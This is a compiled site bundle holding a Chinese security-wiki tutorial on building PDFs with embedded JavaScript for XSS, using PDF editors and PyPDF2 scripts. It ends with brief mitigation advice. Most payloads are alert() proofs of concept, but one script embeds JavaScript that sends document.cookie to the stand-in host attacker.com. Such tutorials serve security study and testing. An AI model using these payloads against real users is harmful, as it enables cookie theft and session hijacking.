"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[259],{7708:(n,a)=>{a.A=(n,a)=>{const s=n.__vccOpts||n;for(const[n,t]of a)s[n]=t;return s}},8854:(n,a,s)=>{s.r(a),s.d(a,{comp:()=>y,data:()=>P});var t=s(4754);const e=s.p+"assets/img/image-20230529113326-xo3882f.a01df4d3.png",p=s.p+"assets/img/image-20230529113343-dw1e85l.86b2dec9.png",o=s.p+"assets/img/image-20230529113356-m8zjc6v.ed865d72.png",i=s.p+"assets/img/image-20230529113406-jmtleea.b992c3bc.png",l=s.p+"assets/img/net-img-894761-20181113130405249-1237312856-20230529113735-qr9bwyo.829613b7.png",c=s.p+"assets/img/net-img-894761-20181113130432900-1972600900-20230529113800-6tia14i.96595f93.png",u=s.p+"assets/img/net-img-894761-20181113130453857-2045778854-20230529113800-x18pxx3.8fd79e2c.png",d=s.p+"assets/img/image-20230529133851-j8tclx7.a065b723.png",r=(0,t.Fv)('<h1 id="_0x01-制作方法" tabindex="-1"><a class="header-anchor" href="#_0x01-制作方法"><span>0x01 制作方法</span></a></h1><h2 id="pdf-编辑软件" tabindex="-1"><a class="header-anchor" href="#pdf-编辑软件"><span>PDF 编辑软件</span></a></h2><h3 id="adobe-acrobat-dc" tabindex="-1"><a class="header-anchor" href="#adobe-acrobat-dc"><span>Adobe Acrobat DC</span></a></h3><p>​<img src="'+e+'" alt="image" loading="lazy">​</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><p>​<img src="'+i+'" alt="image" loading="lazy">​</p><h3 id="迅捷-pdf-编辑" tabindex="-1"><a class="header-anchor" href="#迅捷-pdf-编辑"><span>迅捷 PDF 编辑</span></a></h3><ol><li>启动迅捷 PDF 编辑器打开一个 PDF 文件，或者使用“创建 PDF 文件”功能，通过将其他文档和资源转换为“可移植文档格式”来创建 PDF 文件。</li></ol><p>​<img src="'+l+'" alt="" loading="lazy">​</p><p>​</p><ol start="2"><li>单击左侧的“页面”标签，选择与之对应的页面缩略图，然后从选项下拉菜单中选择“页面属性”命令</li></ol><p>​<img src="'+c+'" alt="" loading="lazy">​</p><p>选择“页面属性”命令</p><ol start="3"><li>在“页面属性”对话框单击“动作”标签，再从“选择动作”下拉菜单中选择“<strong>运行 JavaScript</strong>”命令，然后单击【添加】按钮，弹出 JavaScript 编辑器对话框</li></ol><p>​<img src="'+u+'" alt="" loading="lazy">​</p><p>填写 JavaScript 代码</p><ol start="4"><li><p>在弹出的“JavaScript 编辑器”对话框中输入代码： ​<code>app.alert(‘XSS’);</code>​</p><p>单击【确定】按钮保存 PDF 文件。</p><p>这里需要注意的是：Adobe 支持自身的 JavaScript 对象模型，例如 <code>alert(‘xss’)</code>​ 必须被 APP 对象调用，因此变成了 <code>app.alert(‘xss’)</code>​。这意味着，利用 JavaScript 进行攻击时只能使用 Adobe 所支持的功能。</p></li><li><p>关闭软件，直接打开刚才保存的 PDF 文件，JavaScript 代码即被执行。经过测试最新版本的 360 浏览器和谷歌浏览器支持</p></li><li><p>现在，尝试把 PDF 文件嵌入到网页中并试运行。创建一个 HTML 文档，代码如下：</p></li></ol><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>test.pdf<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100%<span class="token punctuation">&quot;</span></span> <span class="token attr-name">heigh</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100%<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>application/pdf<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>除了把 JavaScript 嵌入 PDF 文件中执行，还可以利用基于 DOM 的方法执行 PDF XSS。此类方法由 Stefano Di Paola 和 Giorgio Fedon 在第 23 届 CCC 安全会议中提出，大家可以参考论文 Adobe Acrobat。</strong></p><p>Stefano Di Paola 把 PDF 中的 DOM XSS 称为 UXSS（Universal Cross-Site Scripting）。事实上，任何支持 PDF 文件的网站都可能存在这种漏洞。</p><h2 id="python" tabindex="-1"><a class="header-anchor" href="#python"><span>Python</span></a></h2><ol><li>首先安装 PyPDF2</li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>\n└─<span class="token comment"># pip install PyPDF2 </span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>直接新建内嵌 xss 的 pdf</li></ol><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfReader<span class="token punctuation">,</span> PdfWriter\n\n<span class="token comment"># 创建一个新的 PDF 文档</span>\noutput_pdf <span class="token operator">=</span> PdfWriter<span class="token punctuation">(</span><span class="token punctuation">)</span>\n<span class="token comment"># 添加一个新页面</span>\npage <span class="token operator">=</span> output_pdf<span class="token punctuation">.</span>add_blank_page<span class="token punctuation">(</span>width<span class="token operator">=</span><span class="token number">72</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">72</span><span class="token punctuation">)</span>\n<span class="token comment"># 添加 js 代码</span>\noutput_pdf<span class="token punctuation">.</span>add_js<span class="token punctuation">(</span><span class="token string">&quot;app.alert(&#39;xss&#39;);&quot;</span><span class="token punctuation">)</span>\n\n<span class="token comment"># 将新页面写入到新 PDF 文档中</span>\n<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;xss.pdf&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>\n    output_pdf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>f<span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>将 JavaScript 代码嵌入到已有 pdf【这个才有效】</li></ol><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfReader<span class="token punctuation">,</span> PdfWriter\n\n<span class="token comment"># 打开原始 PDF 文件</span>\ninput_pdf <span class="token operator">=</span> PdfReader<span class="token punctuation">(</span><span class="token string">&quot;x.pdf&quot;</span><span class="token punctuation">)</span>\n\n<span class="token comment"># 创建一个新的 PDF 文档</span>\noutput_pdf <span class="token operator">=</span> PdfWriter<span class="token punctuation">(</span><span class="token punctuation">)</span>\n\n<span class="token comment"># 将现有的 PDF 页面复制到新文档</span>\n<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>input_pdf<span class="token punctuation">.</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>\n    output_pdf<span class="token punctuation">.</span>add_page<span class="token punctuation">(</span>input_pdf<span class="token punctuation">.</span>pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>\n\n<span class="token comment"># 添加 JavaScript 代码</span>\noutput_pdf<span class="token punctuation">.</span>add_js<span class="token punctuation">(</span><span class="token string">&quot;app.alert(&#39;xss&#39;);&quot;</span><span class="token punctuation">)</span>\n\n<span class="token comment"># 将新 PDF 文档写入到文件中</span>\n<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;xss.pdf&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>\n    output_pdf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>f<span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+d+'" alt="image" loading="lazy"></p><h3 id="显示执行的域" tabindex="-1"><a class="header-anchor" href="#显示执行的域"><span>显示执行的域</span></a></h3><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileWriter<span class="token punctuation">,</span> PdfFileReader\n\n<span class="token comment"># 打开原始 PDF 文件</span>\ninput_pdf <span class="token operator">=</span> PdfFileReader<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;example.pdf&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\n\n<span class="token comment"># 创建一个 PDF 写入对象</span>\noutput_pdf <span class="token operator">=</span> PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span>\n\n<span class="token comment"># 复制输入 PDF 的所有页面</span>\n<span class="token keyword">for</span> page <span class="token keyword">in</span> input_pdf<span class="token punctuation">.</span>pages<span class="token punctuation">:</span>\n    output_pdf<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span>\n\n<span class="token comment"># 在&quot;/OpenAction&quot; 字段中添加 JavaScript 代码</span>\njavascript_code <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;\nvar currentDomain = window.location.hostname;\napp.alert(&quot;JavaScript executed on domain: &quot; + currentDomain);\n&quot;&quot;&quot;</span>\noutput_pdf<span class="token punctuation">.</span>addJS<span class="token punctuation">(</span>javascript_code<span class="token punctuation">)</span>\n\n<span class="token comment"># 将 PDF 保存到文件中</span>\n<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;output.pdf&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>\n    output_pdf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>f<span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="获取-cookie" tabindex="-1"><a class="header-anchor" href="#获取-cookie"><span>获取 cookie</span></a></h3><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileWriter<span class="token punctuation">,</span> PdfFileReader\n\n<span class="token comment"># 创建一个 PDF 文档</span>\noutput_pdf <span class="token operator">=</span> PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span>\n\n<span class="token comment"># 添加一个页面</span>\npage <span class="token operator">=</span> PdfFileReader<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;blank.pdf&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getPage<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>\noutput_pdf<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span>\n\n<span class="token comment"># 添加恶意 JavaScript 代码，这里是一个简单的示例</span>\nmalicious_js <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;\n&lt;&lt;/S/JavaScript/JS(\n    var payload = document.createElement(&quot;img&quot;);\n    payload.src = &quot;http://attacker.com/steal.php?cookie=&quot; + escape(document.cookie);\n    document.body.appendChild(payload);\n)&gt;&gt;&quot;&quot;&quot;</span>\npage<span class="token punctuation">[</span><span class="token string">&quot;/Annots&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>malicious_js<span class="token punctuation">)</span>\n\n<span class="token comment"># 将 PDF 保存到文件中</span>\n<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;malicious.pdf&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>\n    output_pdf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>f<span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="_0x02-修复方法" tabindex="-1"><a class="header-anchor" href="#_0x02-修复方法"><span>0x02 修复方法</span></a></h1>',34),k=(0,t.Lk)("li",null,"而作为网站管理员或开发者，可以选择强迫浏览器下载 PDF 文件，而不是提供在线浏览等，或修改 Web 服务器配置的 header 和相关属性。",-1),m={href:"https://github.com/adobe-type-tools/cmap-resources",target:"_blank",rel:"noopener noreferrer"},v=(0,t.Lk)("h1",{id:"_0x00-前人栽树",tabindex:"-1"},[(0,t.Lk)("a",{class:"header-anchor",href:"#_0x00-前人栽树"},[(0,t.Lk)("span",null,"0x00 前人栽树")])],-1),b={href:"https://www.cnblogs.com/xiaozi/p/9951622.html",target:"_blank",rel:"noopener noreferrer"},g={href:"https://xz.aliyun.com/t/12467",target:"_blank",rel:"noopener noreferrer"},h=(0,t.Lk)("p",null,"‍",-1),f={},y=(0,s(7708).A)(f,[["render",function(n,a){const s=(0,t.g2)("ExternalLinkIcon");return(0,t.uX)(),(0,t.CE)("div",null,[r,(0,t.Lk)("ul",null,[k,(0,t.Lk)("li",null,[(0,t.eW)("可以使用第三方插件解析 pdf，不用 chrome 自带的 pdf 解析，"),(0,t.Lk)("a",m,[(0,t.eW)("https://github.com/adobe-type-tools/cmap-resources"),(0,t.bF)(s)])])]),v,(0,t.Lk)("ul",null,[(0,t.Lk)("li",null,[(0,t.Lk)("a",b,[(0,t.eW)("PDF XSS - Bypass - 博客园 (cnblogs.com)"),(0,t.bF)(s)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",g,[(0,t.eW)("xss pdf 制作 - 先知社区 (aliyun.com)"),(0,t.bF)(s)])])]),h])}]]),P=JSON.parse('{"path":"/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/xss2pdf-%E5%88%B6%E4%BD%9C.html","title":"xss2pdf 制作","lang":"zh-CN","frontmatter":{"title":"xss2pdf 制作","description":"0x01 制作方法 PDF 编辑软件 Adobe Acrobat DC ​image​ ​image​ ​image​ ​image​ 迅捷 PDF 编辑 启动迅捷 PDF 编辑器打开一个 PDF 文件，或者使用“创建 PDF 文件”功能，通过将其他文档和资源转换为“可移植文档格式”来创建 PDF 文件。 ​​ ​ 单击左侧的“页面”标签，选择与之对应...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/xss2pdf-%E5%88%B6%E4%BD%9C.html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"xss2pdf 制作"}],["meta",{"property":"og:description","content":"0x01 制作方法 PDF 编辑软件 Adobe Acrobat DC ​image​ ​image​ ​image​ ​image​ 迅捷 PDF 编辑 启动迅捷 PDF 编辑器打开一个 PDF 文件，或者使用“创建 PDF 文件”功能，通过将其他文档和资源转换为“可移植文档格式”来创建 PDF 文件。 ​​ ​ 单击左侧的“页面”标签，选择与之对应..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-04-07T15:10:52.000Z"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["meta",{"property":"article:modified_time","content":"2024-04-07T15:10:52.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"xss2pdf 制作\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-04-07T15:10:52.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"PDF 编辑软件","slug":"pdf-编辑软件","link":"#pdf-编辑软件","children":[{"level":3,"title":"Adobe Acrobat DC","slug":"adobe-acrobat-dc","link":"#adobe-acrobat-dc","children":[]},{"level":3,"title":"迅捷 PDF 编辑","slug":"迅捷-pdf-编辑","link":"#迅捷-pdf-编辑","children":[]}]},{"level":2,"title":"Python","slug":"python","link":"#python","children":[{"level":3,"title":"显示执行的域","slug":"显示执行的域","link":"#显示执行的域","children":[]},{"level":3,"title":"获取 cookie","slug":"获取-cookie","link":"#获取-cookie","children":[]}]}],"git":{"createdTime":1712502652000,"updatedTime":1712502652000,"contributors":[{"name":"zha0cai","email":"111300972+zha0cai@users.noreply.github.com","commits":1}]},"readingTime":{"minutes":3.19,"words":957},"filePathRelative":"websec/安全漏洞/xss2pdf-制作.md","localizedDate":"2024年4月7日","autoDesc":true}')}}]);